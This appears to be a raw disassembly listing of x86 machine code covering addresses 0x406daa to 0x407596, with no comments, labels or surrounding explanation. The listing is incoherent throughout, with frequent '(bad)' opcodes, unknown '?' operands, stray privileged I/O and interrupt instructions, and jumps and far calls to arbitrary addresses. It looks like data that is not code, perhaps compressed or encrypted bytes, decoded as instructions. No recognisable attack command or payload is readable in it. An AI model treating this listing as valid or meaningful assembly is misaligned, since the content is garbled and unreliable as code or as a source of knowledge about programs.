  406daa:	ins    BYTE PTR es:[edi],dx
  406dab:	fcmovbe st,st(3)
  406dad:	dec    edi
  406dae:	jge    0x406d97
  406db0:	sub    BYTE PTR [edx+0x1d8d052a],ah
  406db6:	out    0x3b,al
  406db8:	adc    al,0x20
  406dba:	rcl    ah,0x4d
  406dbd:	push   es
  406dbe:	(bad)  
  406dbf:	xor    al,0x30
  406dc1:	imul   edx,DWORD PTR [ebp+0x1292c6e8],0x68cf5745
  406dcb:	mov    ch,0xde
  406dcd:	push   ecx
  406dce:	mov    al,ds:0xf857636b
  406dd3:	imul   ebp,esp,0xda04136f
  406dd9:	and    eax,0xffdc613b
  406dde:	mov    esp,0x420dd353
  406de3:	into   
  406de4:	int3   
  406de5:	push   ebx
  406de6:	mov    eax,0xaf4a8cb4
  406deb:	sub    eax,0x5ed163bd
  406df0:	cmp    DWORD PTR [ebx+0x7494efa],0xffffff85
  406df7:	mov    eax,ds:0x18aeef0a
  406dfc:	pop    ebp
  406dfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dfe:	pop    eax
  406dff:	mov    ecx,0x9ec0b0ba
  406e04:	adc    DWORD PTR [ecx+0xb34e814],0xc9699bf
  406e0e:	jnp    0x406dd9
  406e10:	pop    DWORD PTR [edx+0x2b]
  406e13:	xlat   BYTE PTR ds:[ebx]
  406e14:	ret    
  406e15:	xchg   esi,eax
  406e16:	inc    edi
  406e17:	sbb    ch,BYTE PTR [esi]
  406e19:	mov    cs,WORD PTR [edi]
  406e1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e1c:	je     0x406e91
  406e1e:	(bad)  
  406e1f:	out    0x8c,eax
  406e21:	gs out dx,eax
  406e23:	cmp    al,0x19
  406e25:	mov    ah,dl
  406e27:	sti    
  406e28:	jae    0x406e43
  406e2a:	int3   
  406e2b:	lds    ebx,FWORD PTR [esi+edx*8]
  406e2e:	into   
  406e2f:	xchg   edi,eax
  406e30:	jne    0x406e27
  406e32:	or     BYTE PTR [ebx-0x52],ch
  406e35:	shl    BYTE PTR [ebx-0x15731461],0x64
  406e3c:	leave  
  406e3d:	test   BYTE PTR [ecx+0x16],dh
  406e40:	mov    ds:0xb5991e3c,al
  406e45:	mov    esp,0xf912577e
  406e4a:	fiadd  WORD PTR [esi+0x6acd43fd]
  406e50:	dec    eax
  406e51:	jge    0x406e6f
  406e53:	inc    eax
  406e54:	adc    DWORD PTR [eax],0xffffffc8
  406e57:	adc    dl,BYTE PTR [edx+0x61d8440b]
  406e5d:	fisttp QWORD PTR [edi-0x32]
  406e60:	pop    ecx
  406e61:	and    DWORD PTR [ebp-0x6d05533e],ebp
  406e67:	jb     0x406eb7
  406e69:	jo     0x406edc
  406e6b:	mov    es,WORD PTR [eax+ebx*1]
  406e6e:	inc    eax
  406e6f:	pop    es
  406e70:	pop    es
  406e71:	jae    0x406df4
  406e73:	add    eax,0x1e35287
  406e78:	iret   
  406e79:	mov    cl,BYTE PTR [ecx-0x4591a2a9]
  406e7f:	call   0xa416:0x172a29e5
  406e86:	mov    ?,ebp
  406e88:	sub    al,0x36
  406e8a:	fiadd  DWORD PTR [ebp-0x33279591]
  406e90:	xchg   ebp,eax
  406e91:	imul   edx,DWORD PTR [ebp-0x6f],0xffffff96
  406e95:	and    DWORD PTR [ecx+0x6a398668],ebx
  406e9b:	jns    0x406f01
  406e9d:	jmp    0xfba6621a
  406ea2:	mov    ebx,0x5e4ef198
  406ea7:	das    
  406ea8:	jmp    0x406e74
  406eaa:	pop    edi
  406eab:	call   0x3f0d:0x64fd3492
  406eb2:	ret    0xfba4
  406eb5:	push   ebx
  406eb6:	repz dec ebx
  406eb8:	imul   BYTE PTR [esi+0x4f4668ea]
  406ebe:	clc    
  406ebf:	push   0x86644c13
  406ec4:	cdq    
  406ec5:	fsub   QWORD PTR [esi]
  406ec7:	xor    al,dl
  406ec9:	adc    eax,0xb3ebc55a
  406ece:	push   ds
  406ecf:	push   cs
  406ed0:	adc    al,0xc
  406ed2:	js     0x406f01
  406ed4:	xor    edx,DWORD PTR [ebp-0x208c99bf]
  406eda:	mov    ecx,0x1a45229f
  406edf:	in     eax,0x1c
  406ee1:	jae    0x406f33
  406ee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ee4:	(bad)  
  406ee6:	mov    ebp,0xc23762db
  406eeb:	cmp    BYTE PTR [esi],dl
  406eed:	retf   0xcd87
  406ef0:	mov    cl,0x24
  406ef2:	out    0x20,al
  406ef4:	out    0xb4,al
  406ef6:	test   DWORD PTR [edi-0x63],ebp
  406ef9:	or     BYTE PTR [ebx+ebp*1+0x32bf703c],bh
  406f00:	xchg   ebp,eax
  406f01:	xor    cl,dl
  406f03:	out    0x3b,al
  406f05:	push   cs
  406f06:	push   ss
  406f07:	popf   
  406f08:	clc    
  406f09:	jecxz  0x406ef0
  406f0b:	nop
  406f0c:	jnp    0x406eba
  406f0e:	jl     0x406f26
  406f10:	ds dec ebx
  406f12:	int3   
  406f13:	add    BYTE PTR [edx-0x3d768962],cl
  406f19:	jmp    0x406f02
  406f1b:	mov    ebp,0x39590070
  406f20:	add    al,0xb4
  406f22:	mov    edx,0x9675331
  406f27:	sar    esi,cl
  406f29:	pop    ecx
  406f2a:	(bad)  
  406f2b:	imul   ebp,edi,0x3f51873a
  406f31:	pushf  
  406f32:	push   ebx
  406f33:	stos   BYTE PTR es:[edi],al
  406f34:	ret    
  406f35:	lods   eax,DWORD PTR ds:[esi]
  406f36:	aad    0x6d
  406f38:	test   DWORD PTR [ecx-0x40],esp
  406f3b:	enter  0x3b95,0xb4
  406f3f:	mov    al,0xa6
  406f41:	test   BYTE PTR [ebp+0x6546a615],bh
  406f47:	push   ecx
  406f48:	test   DWORD PTR [eax+0x5b],0xc587fdcf
  406f4f:	dec    edx
  406f50:	mov    al,ah
  406f52:	cs loop 0x406ef3
  406f55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f56:	xchg   esi,eax
  406f57:	into   
  406f58:	sbb    eax,0xb0b19194
  406f5d:	mov    dh,0xce
  406f5f:	icebp  
  406f60:	pop    eax
  406f61:	sbb    BYTE PTR [ecx],dl
  406f63:	sub    BYTE PTR [ebx],cl
  406f65:	jle    0x406f4b
  406f67:	pushf  
  406f68:	pop    esp
  406f69:	hlt    
  406f6a:	fwait
  406f6b:	and    eax,esi
  406f6d:	inc    esp
  406f6e:	nop
  406f6f:	ds icebp 
  406f71:	sub    DWORD PTR [edi+0xf],ebx
  406f74:	repz popf 
  406f76:	in     al,0xbf
  406f78:	cmovno ebx,DWORD PTR [ebp+ebp*1-0x39293a1e]
  406f80:	and    al,dl
  406f82:	test   al,0xbf
  406f84:	inc    esi
  406f85:	outs   dx,BYTE PTR ds:[esi]
  406f86:	sti    
  406f87:	loop   0x406f9d
  406f89:	loope  0x406f1d
  406f8b:	imul   eax,ebx,0x674883d4
  406f91:	or     esp,DWORD PTR [esi+0x21]
  406f94:	jl     0x406f21
  406f96:	push   eax
  406f97:	and    eax,0xaf7e1dfa
  406f9c:	mov    edx,0xcc8f2e0b
  406fa1:	inc    esp
  406fa2:	fimul  DWORD PTR ds:0xd6137fb4
  406fa8:	sub    esp,ecx
  406faa:	shl    DWORD PTR [edx-0xe],0x84
  406fae:	jmp    0x3b0f:0x27ce1eac
  406fb5:	sbb    ecx,DWORD PTR [edi-0x4de4a16d]
  406fbb:	xchg   esi,eax
  406fbc:	jns    0x40702f
  406fbe:	in     eax,0xd1
  406fc0:	sub    BYTE PTR [ecx*1+0x6f5395a7],ch
  406fc7:	push   esp
  406fc8:	cmp    eax,0xede8ae68
  406fcd:	lods   al,BYTE PTR ds:[esi]
  406fce:	pusha  
  406fcf:	jo     0x406f66
  406fd1:	push   ecx
  406fd2:	ins    BYTE PTR es:[edi],dx
  406fd3:	fs gs mov cl,0xd5
  406fd7:	mov    cl,0x42
  406fd9:	mov    DWORD PTR [eax+ebp*1-0x6f5d9155],0x1b320220
  406fe4:	pop    esi
  406fe5:	sbb    eax,DWORD PTR [ebx+0x67bfedc4]
  406feb:	gs fwait
  406fed:	sti    
  406fee:	sbb    BYTE PTR [esp+ebp*4+0xa95f222],cl
  406ff5:	(bad)  
  406ff6:	std    
  406ff7:	enter  0xdcc1,0x1f
  406ffb:	or     dh,dh
  406ffd:	cdq    
  406ffe:	mov    al,ds:0x22005ba1
  407003:	bound  esi,QWORD PTR [ebx+ebp*4+0x2e]
  407007:	xor    eax,DWORD PTR [esi+0x41]
  40700a:	(bad)  
  40700b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40700c:	mov    dh,0xf
  40700e:	sbb    al,0x34
  407010:	shr    DWORD PTR [edx+0x438dc55d],1
  407016:	dec    ecx
  407017:	mov    cl,0x90
  407019:	mov    bh,0xe2
  40701b:	dec    edx
  40701c:	and    al,0x51
  40701e:	bound  ecx,QWORD PTR [eax]
  407020:	out    dx,al
  407021:	retf   
  407022:	mov    bl,0x1c
  407024:	sbb    al,0xe7
  407026:	mov    edi,0xc785ebd4
  40702b:	mov    eax,0x7134c567
  407030:	retf   
  407031:	mov    edx,0x38eabe8e
  407036:	cmp    dh,BYTE PTR [ebx-0x70]
  407039:	loope  0x4070b8
  40703b:	aaa    
  40703c:	icebp  
  40703d:	jle    0x407052
  40703f:	(bad)  [eax+0x30]
  407042:	ret    
  407043:	ins    DWORD PTR es:[edi],dx
  407044:	mov    dl,0xba
  407046:	cmovg  esi,DWORD PTR [ecx+eax*4]
  40704a:	and    BYTE PTR [ebx+0x14a59d0],cl
  407050:	stc    
  407051:	inc    ebp
  407052:	scas   eax,DWORD PTR es:[edi]
  407053:	repnz lock xor al,BYTE PTR ds:0x5e6daa13
  40705b:	shr    DWORD PTR [ebx+0x746a0f41],1
  407061:	xchg   esi,eax
  407062:	mov    bh,0x58
  407064:	(bad)  
  407065:	popa   
  407066:	sbb    al,0x2a
  407068:	mov    ch,0xa0
  40706a:	mov    edx,0x968bda03
  40706f:	push   edx
  407070:	fcmove st,st(5)
  407072:	(bad)  
  407073:	push   edx
  407074:	aas    
  407075:	lahf   
  407076:	adc    ah,BYTE PTR [ecx+eiz*1+0x455d5146]
  40707d:	push   0x21
  40707f:	leave  
  407080:	shl    eax,cl
  407082:	into   
  407083:	popa   
  407084:	(bad)  
  407085:	int    0xba
  407087:	sub    eax,DWORD PTR [eax]
  407089:	pop    edx
  40708a:	icebp  
  40708b:	pop    ebp
  40708c:	out    dx,eax
  40708d:	push   edi
  40708e:	jo     0x407030
  407090:	les    ebp,FWORD PTR [edi]
  407092:	enter  0x9e3c,0x88
  407096:	jnp    0x4070e3
  407098:	and    BYTE PTR [ebx+edx*1+0x6bab9ee6],ah
  40709f:	int3   
  4070a0:	ror    ecx,1
  4070a2:	mov    edi,0x82024268
  4070a7:	int3   
  4070a8:	pusha  
  4070a9:	add    eax,0x11cbab5f
  4070ae:	mov    bh,BYTE PTR [ebp+0x1e885989]
  4070b4:	mov    ebx,0xb88d0dab
  4070b9:	and    DWORD PTR [ecx+0x713d3a35],edx
  4070bf:	cdq    
  4070c0:	push   es
  4070c1:	fisttp QWORD PTR [ebx+0x1f32c41a]
  4070c7:	pop    eax
  4070c8:	lahf   
  4070c9:	jns    0x40713a
  4070cb:	jns    0x40705a
  4070cd:	xor    ebp,DWORD PTR [edi]
  4070cf:	xor    eax,0xbe4a81fc
  4070d4:	ror    BYTE PTR [edx-0x12c7e7af],0x1e
  4070db:	lods   al,BYTE PTR ds:[esi]
  4070dc:	gs pop es
  4070de:	sbb    eax,0xa8ef2fe1
  4070e3:	inc    edx
  4070e4:	mov    ebp,DWORD PTR [eax]
  4070e6:	retf   0x678
  4070e9:	cmp    DWORD PTR [esi+0x41],ecx
  4070ec:	cdq    
  4070ed:	dec    eax
  4070ee:	cmovb  ebx,DWORD PTR [edi]
  4070f1:	jae    0x407133
  4070f3:	ror    bl,0x5d
  4070f6:	cmp    DWORD PTR [ecx],0xb8245c3a
  4070fc:	pop    edx
  4070fd:	ss sub al,0x83
  407100:	adc    DWORD PTR ds:0x1d8f3527,ebx
  407106:	(bad)  
  407107:	fdiv   st,st(1)
  407109:	out    dx,eax
  40710a:	sbb    BYTE PTR [ebp+0x1a59fdba],0x8d
  407111:	fsubr  QWORD PTR [edx+0x68]
  407114:	mov    eax,0x1815b4a3
  407119:	stc    
  40711a:	ins    BYTE PTR es:[edi],dx
  40711b:	stos   DWORD PTR es:[edi],eax
  40711c:	dec    ebp
  40711d:	xor    eax,0x6a468942
  407122:	aad    0x57
  407124:	icebp  
  407125:	mov    bh,0x38
  407127:	sar    DWORD PTR [eax+0x1be09c5d],0x37
  40712e:	cmp    DWORD PTR [ebp-0x8],edx
  407131:	pop    esi
  407132:	icebp  
  407133:	(bad)  
  407134:	jmp    0x3cc33b6f
  407139:	test   bl,dl
  40713b:	das    
  40713c:	push   ds
  40713d:	mov    ch,0xa3
  40713f:	push   ebp
  407140:	mov    cl,0xe5
  407142:	leave  
  407143:	je     0x407116
  407145:	dec    ebx
  407146:	cwde   
  407147:	lahf   
  407148:	aaa    
  407149:	jo     0x40711a
  40714b:	call   0x8f16c560
  407150:	int    0x79
  407152:	cdq    
  407153:	inc    esp
  407154:	dec    edi
  407155:	call   0xfa2f:0x42931fb8
  40715c:	call   0xd56cf6af
  407161:	popf   
  407162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407163:	jo     0x407189
  407165:	inc    ebp
  407166:	retf   0x49ec
  407169:	pop    ds
  40716a:	or     BYTE PTR [ecx],ah
  40716c:	cmp    al,0xc8
  40716e:	add    al,0x4b
  407170:	shl    al,0x0
  407173:	cmp    ecx,DWORD PTR [ebp-0x711761d7]
  407179:	test   al,ch
  40717b:	xchg   esp,eax
  40717c:	ins    DWORD PTR es:[edi],dx
  40717d:	push   cs
  40717e:	pop    ebx
  40717f:	push   ss
  407180:	cs pop edi
  407182:	popf   
  407183:	jg     0x4071c0
  407185:	adc    bh,bh
  407187:	test   BYTE PTR [ebx-0x66],ch
  40718a:	xor    esp,DWORD PTR [ebx+0x40]
  40718d:	(bad)  
  40718f:	mov    dl,0x26
  407191:	dec    ebp
  407192:	xchg   edx,eax
  407193:	push   ecx
  407194:	and    cl,bl
  407196:	fcmovbe st,st(6)
  407198:	adc    eax,DWORD PTR ds:0x91210976
  40719e:	cmc    
  40719f:	push   edi
  4071a0:	(bad)  
  4071a1:	and    ah,BYTE PTR [ebx+0x1b]
  4071a4:	mov    edx,0xc989d6ae
  4071a9:	aaa    
  4071aa:	repz adc BYTE PTR [edx],ch
  4071ad:	(bad)
  4071b1:	in     eax,dx
  4071b2:	inc    esp
  4071b3:	(bad)  
  4071b4:	imul   esi,edi,0x60
  4071b7:	rcr    BYTE PTR [eax],cl
  4071b9:	out    0xbe,al
  4071bb:	sub    ah,cl
  4071bd:	es mov ch,0xf4
  4071c0:	pop    eax
  4071c1:	inc    eax
  4071c2:	inc    esi
  4071c3:	push   0x9c579132
  4071c8:	adc    BYTE PTR [ebx-0x2ad1ef6d],dl
  4071ce:	int    0x79
  4071d0:	push   edi
  4071d1:	pop    edx
  4071d2:	mov    DWORD PTR [edx+0x40],edi
  4071d5:	imul   esp,edi,0x93f2b76
  4071db:	scas   eax,DWORD PTR es:[edi]
  4071dc:	cmp    edi,ebp
  4071de:	jl     0x4071f4
  4071e0:	adc    cl,al
  4071e2:	shr    DWORD PTR [esi-0x6a],1
  4071e5:	pop    ss
  4071e6:	data16 into 
  4071e8:	mov    ebx,DWORD PTR [edi]
  4071ea:	add    DWORD PTR [esp+ebp*8],eax
  4071ed:	cmp    BYTE PTR [eax-0x206b593f],bh
  4071f3:	pushw  es
  4071f5:	in     eax,dx
  4071f6:	scas   al,BYTE PTR es:[edi]
  4071f7:	dec    esi
  4071f8:	xchg   DWORD PTR [ebx],edx
  4071fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071fb:	and    al,0xd7
  4071fd:	mov    edx,0x9d16eb48
  407202:	enter  0xffb6,0xc5
  407206:	rol    DWORD PTR [ebx-0x36],1
  407209:	loop   0x40719f
  40720b:	rol    dl,cl
  40720d:	sbb    bh,bh
  40720f:	rol    BYTE PTR [ebx],1
  407211:	or     al,0x39
  407213:	clc    
  407214:	bound  ecx,QWORD PTR [eax-0x36b82ac9]
  40721a:	cmp    DWORD PTR [ebp-0x54],esp
  40721d:	iret   
  40721e:	pop    ebp
  40721f:	cmp    al,0xbf
  407221:	pop    ebp
  407222:	aas    
  407223:	inc    esi
  407224:	das    
  407225:	fisubr DWORD PTR [edi-0x78]
  407228:	inc    ecx
  407229:	inc    ebx
  40722a:	xor    BYTE PTR [esi-0x7801adb4],ah
  407230:	in     al,dx
  407231:	sub    al,0xb5
  407233:	jg     0x407245
  407235:	leave  
  407236:	adc    bh,BYTE PTR [ecx+ebp*8]
  407239:	add    dl,BYTE PTR [edi-0x8]
  40723c:	pop    ecx
  40723d:	mov    ebp,0x8bcb8faa
  407242:	mov    dl,BYTE PTR [ebp+0xb3c91d8]
  407248:	gs jnp 0x407256
  40724b:	sar    BYTE PTR [ebp-0x52],0x44
  40724f:	ret    
  407250:	and    ebp,edi
  407252:	jb     0x407277
  407254:	xchg   edi,eax
  407255:	push   edi
  407256:	out    0x7c,al
  407258:	ffree  st(7)
  40725a:	mov    dl,0xf0
  40725c:	in     al,dx
  40725d:	pusha  
  40725e:	imul   esi,ebx,0xa90efead
  407264:	sbb    eax,DWORD PTR [ecx+0x43]
  407267:	(bad)  
  407268:	jmp    0xf3777eb4
  40726d:	jns    0x40722b
  40726f:	sbb    eax,0x3a48ff85
  407274:	xchg   edi,eax
  407275:	push   esi
  407276:	lds    eax,FWORD PTR [ebx-0x4c180223]
  40727c:	jmp    0x305e:0x69b85e4a
  407283:	clc    
  407284:	mov    dh,0x92
  407286:	xlat   BYTE PTR ds:[ebx]
  407287:	push   ds
  407288:	mov    dl,0xd2
  40728a:	call   DWORD PTR [esi]
  40728c:	ds pop eax
  40728e:	in     eax,dx
  40728f:	xchg   edx,eax
  407290:	imul   ebx,DWORD PTR [eax],0xaf19ad3f
  407296:	fnstsw WORD PTR [edi+0x1c]
  407299:	push   eax
  40729a:	out    dx,eax
  40729b:	and    DWORD PTR [edx+0x36432cee],eax
  4072a1:	test   DWORD PTR [ebx+0x7d],edi
  4072a4:	push   esi
  4072a5:	cwde   
  4072a6:	mov    edi,DWORD PTR [ecx]
  4072a8:	pop    esi
  4072a9:	xchg   edi,eax
  4072aa:	jne    0x407249
  4072ac:	push   ds
  4072ad:	push   ecx
  4072ae:	pop    ecx
  4072af:	jae    0x40723a
  4072b1:	sub    bh,bl
  4072b3:	mov    WORD PTR [edi-0x5ab03977],?
  4072b9:	sub    edx,edx
  4072bb:	fcomp  st(1)
  4072bd:	adc    edx,DWORD PTR [esi-0x63]
  4072c0:	and    al,0x92
  4072c2:	sub    DWORD PTR [esi-0x68f710dc],edx
  4072c8:	push   ebp
  4072c9:	and    DWORD PTR [edx],edi
  4072cb:	shl    DWORD PTR [eax+0x4ef10a6],1
  4072d1:	xchg   ebp,eax
  4072d2:	dec    edi
  4072d3:	retf   0x61c5
  4072d6:	loop   0x407325
  4072d8:	jb     0x407276
  4072da:	sub    BYTE PTR [eax+0x355d4d9],cl
  4072e0:	push   edx
  4072e1:	jmp    0x4072db
  4072e3:	mov    ebx,ds
  4072e5:	mov    ebx,0x36ce7923
  4072ea:	cmc    
  4072eb:	scas   al,BYTE PTR es:[edi]
  4072ec:	push   esi
  4072ed:	bswap  esi
  4072ef:	popf   
  4072f0:	jns    0x407371
  4072f2:	sbb    DWORD PTR [eax],edi
  4072f4:	cld    
  4072f5:	(bad)  
  4072f6:	hlt    
  4072f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4072f8:	mov    ds:0xb250181c,eax
  4072fd:	enter  0x5be9,0x68
  407301:	mov    eax,ds:0x76155548
  407306:	loop   0x4072e9
  407308:	push   ebx
  407309:	inc    esi
  40730a:	das    
  40730b:	push   esi
  40730c:	scas   al,BYTE PTR es:[edi]
  40730d:	mov    dl,0x8d
  40730f:	pop    ebp
  407310:	into   
  407311:	inc    esp
  407312:	out    0xb3,al
  407314:	enterw 0x2119,0x6f
  407319:	fistp  QWORD PTR [esi+0x6d]
  40731c:	mov    ?,WORD PTR [ecx+0x20]
  40731f:	or     DWORD PTR [esi+esi*8],eax
  407322:	or     al,0xe7
  407324:	iret   
  407325:	fwait
  407326:	pop    esi
  407327:	add    eax,0xc67a1ce9
  40732c:	inc    edi
  40732d:	mov    gs,WORD PTR [ecx-0x6a45b909]
  407333:	and    esp,DWORD PTR [edi]
  407335:	(bad)  
  407336:	lods   al,BYTE PTR ds:[esi]
  407337:	mov    BYTE PTR [edx],ah
  407339:	push   ss
  40733a:	lds    esp,FWORD PTR [edi-0x39]
  40733d:	fld    TBYTE PTR [edi+0x71]
  407340:	mov    al,ds:0x7160aadf
  407345:	xor    ebx,DWORD PTR [ebp-0x29]
  407348:	leave  
  407349:	je     0x4073a9
  40734b:	sub    BYTE PTR [edx+0x3e6179e4],dh
  407351:	cmp    DWORD PTR [ecx+0x7c],edi
  407354:	icebp  
  407355:	in     al,dx
  407356:	dec    ecx
  407357:	stc    
  407358:	das    
  407359:	clc    
  40735a:	and    DWORD PTR [edi+0x60a3a806],esi
  407360:	pop    eax
  407361:	mov    cl,0xde
  407363:	pop    esi
  407364:	scas   al,BYTE PTR es:[edi]
  407365:	or     BYTE PTR ds:0x8f90c177,0xa
  40736c:	adc    eax,DWORD PTR [ecx-0x7fc8aa08]
  407372:	imul   ebx,DWORD PTR [edx],0x1ff76b35
  407378:	sahf   
  407379:	dec    eax
  40737a:	adc    DWORD PTR [edx+0x5c],edi
  40737d:	push   ecx
  40737e:	iret   
  40737f:	cli    
  407380:	jl     0x407394
  407382:	inc    ebx
  407383:	xchg   esi,eax
  407384:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407385:	or     al,0x1c
  407387:	xchg   edi,eax
  407388:	fidiv  DWORD PTR [ecx+0x38]
  40738b:	hlt    
  40738c:	adc    al,0xe2
  40738e:	add    BYTE PTR [ecx+0x48],bl
  407391:	(bad)  [edx+edi*4]
  407394:	call   0x1ca9:0x344a873d
  40739b:	jo     0x4073d1
  40739d:	sti    
  40739e:	push   eax
  40739f:	dec    esi
  4073a0:	dec    edi
  4073a1:	jmp    0x40739d
  4073a3:	mov    edi,0xac1b7b35
  4073a8:	cwde   
  4073a9:	pop    edx
  4073aa:	add    ah,dh
  4073ac:	mov    al,0x74
  4073ae:	sub    cl,BYTE PTR ds:0xf2096596
  4073b4:	adc    eax,0xfad4c0bd
  4073b9:	inc    esi
  4073ba:	ds repnz aas 
  4073bd:	push   edi
  4073be:	or     al,0xbf
  4073c0:	jge    0x4073df
  4073c2:	jmp    0x4073df
  4073c4:	mov    dh,0x3e
  4073c6:	neg    BYTE PTR [edi+0x31546d7]
  4073cc:	les    ecx,FWORD PTR [ebp+0x14]
  4073cf:	test   ebp,0x5dfe3cea
  4073d5:	dec    ebx
  4073d6:	dec    BYTE PTR [edx]
  4073d8:	cmp    BYTE PTR [edx],bl
  4073da:	mov    al,0x58
  4073dc:	mov    ah,0xe4
  4073de:	mov    edi,DWORD PTR [edx+0x26]
  4073e1:	xlat   BYTE PTR ds:[ebx]
  4073e2:	call   0x4de2c16a
  4073e7:	add    BYTE PTR [esi+0xe5d343a],cl
  4073ed:	sar    BYTE PTR [ebx-0x33],cl
  4073f0:	int3   
  4073f1:	mov    cs,ebp
  4073f3:	push   0xc73f65c2
  4073f8:	fisubr WORD PTR [edi-0x4b]
  4073fb:	rcl    DWORD PTR [eax],cl
  4073fd:	ja     0x4073d9
  4073ff:	pop    edx
  407400:	sbb    DWORD PTR [edi-0x3a457777],edx
  407406:	sar    BYTE PTR [ecx],0x47
  407409:	cdq    
  40740a:	adc    edi,edx
  40740c:	jg     0x407443
  40740e:	sbb    DWORD PTR [ebp+esi*8+0x14eba9f4],ecx
  407415:	aam    0x8
  407417:	sub    eax,0xc64c9de6
  40741c:	ins    DWORD PTR es:[edi],dx
  40741d:	(bad)  
  40741e:	out    dx,al
  40741f:	pop    edx
  407420:	mov    ds:0x37e30c51,eax
  407425:	dec    eax
  407426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407427:	in     al,dx
  407428:	jecxz  0x407407
  40742a:	mov    ebp,edx
  40742c:	in     eax,0xbe
  40742e:	push   ebx
  40742f:	data16 jge 0x407401
  407432:	cmp    DWORD PTR [ebx],esi
  407434:	mov    ebp,0x7d5173b3
  407439:	dec    edx
  40743a:	push   es
  40743b:	outs   dx,BYTE PTR ds:[esi]
  40743c:	loopne 0x4073cc
  40743e:	xchg   ebp,eax
  40743f:	leave  
  407440:	ret    0xbf54
  407443:	out    0xae,eax
  407445:	mov    ebp,0x66ef88f5
  40744a:	inc    edi
  40744b:	rcr    DWORD PTR [edi+0x19],1
  40744e:	sbb    eax,0xfffffff5
  407451:	jmp    0x9fb7:0x427c4e4c
  407458:	cmp    al,0xb2
  40745a:	cld    
  40745b:	clc    
  40745c:	dec    esp
  40745d:	xor    bh,BYTE PTR [ecx+ecx*4]
  407460:	or     DWORD PTR [eax+0x20],edi
  407463:	sub    DWORD PTR [edi-0x49701b01],ebp
  407469:	cmp    al,0x29
  40746b:	loope  0x407431
  40746d:	push   eax
  40746e:	jmp    0xc8c3:0x671a4203
  407475:	cmp    al,0xc5
  407477:	icebp  
  407478:	stos   BYTE PTR es:[edi],al
  407479:	jg     0x407442
  40747b:	dec    edx
  40747c:	jge    0x407436
  40747e:	imul   edx,DWORD PTR fs:0x28c030cb,0xffffffb8
  407486:	arpl   WORD PTR [esi-0x5188d19b],di
  40748c:	pop    edi
  40748d:	mov    edx,0xe10953e1
  407492:	jnp    0x4074b0
  407494:	gs add al,0xe4
  407497:	or     al,0x44
  407499:	lods   eax,DWORD PTR ds:[esi]
  40749a:	pushf  
  40749b:	push   ebp
  40749c:	stos   BYTE PTR es:[edi],al
  40749d:	push   0xffffffdd
  40749f:	(bad)  
  4074a1:	enter  0x5393,0x17
  4074a5:	ror    DWORD PTR [ebx+ebp*1-0x9],cl
  4074a9:	pop    esi
  4074aa:	es in  al,dx
  4074ac:	imul   DWORD PTR [esi-0x579edc58]
  4074b2:	mov    bh,0xe1
  4074b4:	cmp    al,0x63
  4074b6:	enter  0xdad7,0x4c
  4074ba:	pop    edi
  4074bb:	sub    eax,0x29920fc5
  4074c0:	pop    esi
  4074c1:	inc    ecx
  4074c2:	mov    esi,0x6d5053ee
  4074c7:	sub    ebx,esp
  4074c9:	jge    0x407544
  4074cb:	fisttp WORD PTR [esi+0x4b]
  4074ce:	and    ebx,DWORD PTR [ebp+0x3]
  4074d1:	xor    BYTE PTR [ebx+0x6a],0x71
  4074d5:	mov    ebp,0x81a2e172
  4074da:	fadd   DWORD PTR [ebx+0x2ce604bc]
  4074e0:	(bad)  
  4074e1:	sbb    eax,0x26973f6e
  4074e6:	cld    
  4074e7:	jb     0x4074b9
  4074e9:	retf   
  4074ea:	mov    bl,0x3d
  4074ec:	scas   al,BYTE PTR es:[edi]
  4074ed:	mov    bl,0x16
  4074ef:	add    edi,ecx
  4074f1:	(bad)  
  4074f2:	jecxz  0x40756c
  4074f4:	psubd  mm1,mm4
  4074f7:	int3   
  4074f8:	mov    ch,BYTE PTR [ebp-0x47]
  4074fb:	adc    eax,0x7fb0226c
  407500:	popa   
  407501:	pop    ds
  407502:	sub    esp,DWORD PTR [eax-0xa]
  407505:	ficom  DWORD PTR [ebp+0xee15ce2]
  40750b:	or     BYTE PTR [ebp-0x33bca910],dl
  407511:	and    esi,DWORD PTR [edi]
  407513:	inc    edi
  407514:	push   eax
  407515:	xor    al,al
  407517:	pop    ebx
  407518:	sub    BYTE PTR [edi+0x6445eb55],ah
  40751e:	sbb    DWORD PTR [edx-0x16cea2f3],edi
  407524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407525:	dec    ebp
  407526:	pop    ds
  407527:	add    eax,0x2a33344c
  40752c:	lock xchg ecx,eax
  40752e:	je     0x4074bd
  407530:	add    BYTE PTR [edi],0x1c
  407533:	cwde   
  407534:	in     eax,0x28
  407536:	add    cl,dl
  407538:	clc    
  407539:	sub    edx,DWORD PTR [ebx-0x4b9d5af1]
  40753f:	sar    bl,0xb0
  407542:	cmp    al,0x4f
  407544:	cmp    al,0x8d
  407546:	jg     0x407565
  407548:	xchg   esi,eax
  407549:	mov    ds:0xc49f9d94,al
  40754e:	xchg   edi,eax
  40754f:	stos   BYTE PTR es:[edi],al
  407550:	ins    BYTE PTR es:[edi],dx
  407551:	pop    esp
  407552:	ret    0x8c80
  407555:	mov    WORD PTR [esi-0x3e7ab8e5],fs
  40755b:	pop    ecx
  40755c:	mov    ds:0xfaad2109,eax
  407561:	cdq    
  407562:	jae    0x40752f
  407564:	jecxz  0x4075c4
  407566:	cs mov esp,0x67d6e466
  40756c:	daa    
  40756d:	fs int3 
  40756f:	pop    esi
  407570:	jecxz  0x407535
  407572:	dec    ebx
  407573:	loope  0x4074f6
  407575:	popf   
  407576:	leave  
  407577:	mov    edx,0x9ba98eea
  40757c:	daa    
  40757d:	cmp    eax,0x312be5cd
  407582:	neg    cl
  407584:	mov    bl,0x76
  407586:	dec    ebx
  407587:	xchg   esi,eax
  407588:	pop    eax
  407589:	pop    esi
  40758a:	call   esi
  40758c:	cmp    ebx,DWORD PTR [edx-0x2b69dd46]
  407592:	sbb    ah,BYTE PTR [ebp+ecx*1+0x42]
  407596:	outs   dx,DWORD PTR ds:[esi]
